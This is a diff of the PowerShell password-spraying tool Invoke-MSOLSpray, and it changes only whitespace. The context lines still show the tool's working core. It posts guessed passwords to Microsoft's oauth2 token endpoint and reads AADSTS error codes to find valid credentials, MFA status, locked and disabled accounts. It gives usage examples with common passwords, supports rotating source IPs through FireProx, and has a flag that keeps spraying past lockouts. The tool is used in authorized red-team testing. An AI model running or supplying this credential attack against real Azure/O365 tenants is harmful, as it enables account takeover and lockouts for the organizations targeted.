@@ -4,7 +4,7 @@ function Invoke-MSOLSpray{
 
 <#
     .SYNOPSIS
-        This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.       
+        This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
         MSOLSpray Function: Invoke-MSOLSpray
         Author: Beau Bullock (@dafthack)
         License: BSD 3-Clause
@@ -12,46 +12,46 @@ function Invoke-MSOLSpray{
         Optional Dependencies: None
 
     .DESCRIPTION
-        
-        This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.        
-    
+
+        This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
+
     .PARAMETER UserList
-        
+
         UserList file filled with usernames one-per-line in the format "user@domain.com"
-    
+
     .PARAMETER UserName
 
         A single user to spray in the format "user@domain.com".
 
     .PARAMETER Password
-        
+
         A single password that will be used to perform the password spray.
-    
+
     .PARAMETER Delay
 
         A number in seconds to delay between requests.
 
     .PARAMETER OutFile
-        
+
         A file to output valid results to.
-    
+
     .PARAMETER Force
-        
+
         Forces the spray to continue and not stop when multiple account lockouts are detected.
-    
+
     .PARAMETER URL
-        
+
         The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
-    
+
     .EXAMPLE
-        
+
         C:\PS> Invoke-MSOLSpray -UserName user@company.com -Password Winter2020
         Description
         -----------
         This command will use the provided username and attempt to authenticate to with a password of Winter2020.
-    
+
     .EXAMPLE
-        
+
         C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password P@ssword -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox -OutFile valid-users.txt
         Description
         -----------
@@ -89,9 +89,9 @@ function Invoke-MSOLSpray{
     [switch]
     $Force
   )
-    
+
     $ErrorActionPreference= 'silentlycontinue'
-    
+
     if ($UserName -ne "") {
         $Usernames = $UserName
     } else {
@@ -109,7 +109,7 @@ function Invoke-MSOLSpray{
     Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"
 
     ForEach ($username in $usernames){
-        
+
         # User counter
         $curr_user += 1
         Write-Host -nonewline "$curr_user of $count users tested`r"
@@ -120,7 +120,7 @@ function Invoke-MSOLSpray{
         if ($Delay) {
             Start-Sleep -Seconds $Delay
         }
-        $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
+        $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr
 
         # If we get a 200 response code it's a valid cred
         If ($webrequest.StatusCode -eq "200"){
@@ -133,7 +133,7 @@ function Invoke-MSOLSpray{
                 # Here is a referense list of all the Azure AD Authentication an Authorization Error Codes:
                 # https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
 
-                # Standard invalid password 
+                # Standard invalid password
                 # my modifications here
             If($RespErr -match "AADSTS50126")
                 {
@@ -160,7 +160,7 @@ function Invoke-MSOLSpray{
                 Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates MFA (Microsoft) is in use."
                 $fullresults += "$username : $password"
                 }
-    
+
                 # Conditional Access response (Based off of limited testing this seems to be the repsonse to DUO MFA)
             ElseIf($RespErr -match "AADSTS50158")
                 {
@@ -187,7 +187,7 @@ function Invoke-MSOLSpray{
                 {
                 Write-Output "[*] WARNING! The account $username appears to be disabled."
                 }
-            
+
                 # User password is expired
             ElseIf($RespErr -match "AADSTS50055")
                 {
@@ -202,7 +202,7 @@ function Invoke-MSOLSpray{
                 $RespErr
                 }
         }
-    
+
         # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
         if (!$Force -and $lockout_count -eq 10 -and $lockoutquestion -eq 0)
         {
@@ -226,7 +226,7 @@ function Invoke-MSOLSpray{
                 break
             }
         }
-        
+
     }
 
     # Output to file
